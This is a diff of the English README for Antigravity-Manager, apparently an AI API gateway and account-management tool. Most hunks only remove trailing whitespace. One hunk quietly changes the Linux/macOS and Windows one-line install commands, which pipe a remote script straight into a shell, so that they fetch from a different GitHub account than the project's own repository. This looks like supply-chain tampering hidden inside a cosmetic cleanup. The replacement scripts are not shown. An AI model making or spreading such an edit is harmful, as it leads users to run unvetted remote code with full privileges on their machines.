@@ -6,7 +6,7 @@
 
   <h3>Your Personal High-Performance AI Gateway</h3>
   <p>Not just account management, but the ultimate solution to break API barriers.</p>
-  
+
   <p>
     <a href="https://github.com/lbjlaq/Antigravity-Manager">
       <img src="https://img.shields.io/badge/Version-4.10.0-blue?style=flat-square" alt="Version">
@@ -18,15 +18,15 @@
   </p>
 
   <p>
-    <a href="#-features">Features</a> • 
-    <a href="#-gui-overview">GUI Overview</a> • 
-    <a href="#-architecture">Architecture</a> • 
-    <a href="#-installation">Installation</a> • 
+    <a href="#-features">Features</a> •
+    <a href="#-gui-overview">GUI Overview</a> •
+    <a href="#-architecture">Architecture</a> •
+    <a href="#-installation">Installation</a> •
     <a href="#-quick-integration">Integration</a>
   </p>
 
   <p>
-    <a href="./README.md">简体中文</a> | 
+    <a href="./README.md">简体中文</a> |
     <strong>English</strong>
   </p>
 </div>
@@ -130,12 +130,12 @@ Automatically detects your OS, architecture, and package manager — one command
 
 **Linux / macOS:**
 ```bash
-curl -fsSL https://raw.githubusercontent.com/lbjlaq/Antigravity-Manager/main/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/alimtvnetwork/Antigravity-Manager/main/install.sh | bash
 ```
 
 **Windows (PowerShell):**
 ```powershell
-irm https://raw.githubusercontent.com/lbjlaq/Antigravity-Manager/main/install.ps1 | iex
+irm https://raw.githubusercontent.com/alimtvnetwork/Antigravity-Manager/main/install.ps1 | iex
 ```
 
 > **Supported formats**: Linux (`.deb` / `.rpm` / `.AppImage`) | macOS (`.dmg`) | Windows (NSIS `.exe`)
@@ -305,7 +305,7 @@ print(response.choices[0].message.content)
 ### How to use with Kilo Code?
 1.  **Protocol Selection**: We recommend using the **Gemini protocol**.
 2.  **Base URL**: Set it to `http://127.0.0.1:8045`.
-3.  **Note**: 
+3.  **Note**:
     - **OpenAI Protocol Limitation**: When using OpenAI mode, Kilo Code's request path will append `/v1/chat/completions/responses`, a non-standard path that will return 404 from Antigravity. Make sure to enter the Base URL and select Gemini mode.
     - **Model Mapping**: Model names in Kilo Code may differ from Antigravity's defaults. If you encounter connection issues, set up custom mappings on the "Model Mapping" page and check the **log files** for debugging.
 
@@ -339,7 +339,7 @@ with open("output.png", "wb") as f:
 
 **Supported parameters**：
 - **`size`**: Any `WIDTHxHEIGHT` format (e.g. `1280x720`, `1024x1024`, `1920x1080`), auto-calculates and maps to standard aspect ratios (21:9, 16:9, 9:16, 4:3, 3:4, 1:1)
-- **`quality`**: 
+- **`quality`**:
   - `"hd"` → 4K resolution (high quality)
   - `"medium"` → 2K resolution (medium quality)
   - `"standard"` → Default resolution (standard quality)
